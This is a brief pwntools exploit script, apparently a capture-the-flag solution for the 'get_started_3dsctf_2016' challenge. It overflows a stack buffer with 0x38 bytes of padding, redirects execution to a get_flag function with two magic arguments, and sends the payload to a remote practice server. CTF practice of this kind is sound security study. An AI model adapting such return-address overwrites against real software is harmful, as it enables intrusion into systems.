from pwn import *

context.log_level = 'debug'
# io = process('get_started_3dsctf_2016')
io = remote('node3.buuoj.cn', 28657)
get_flag = 0x080489A0
exit_addr = 0x0804E6A0
payload = cyclic(0x38) + p32(get_flag) + p32(exit_addr) + p32(0x308CD64F) + p32(0x195719D1)
io.sendline(payload)
io.interactive()
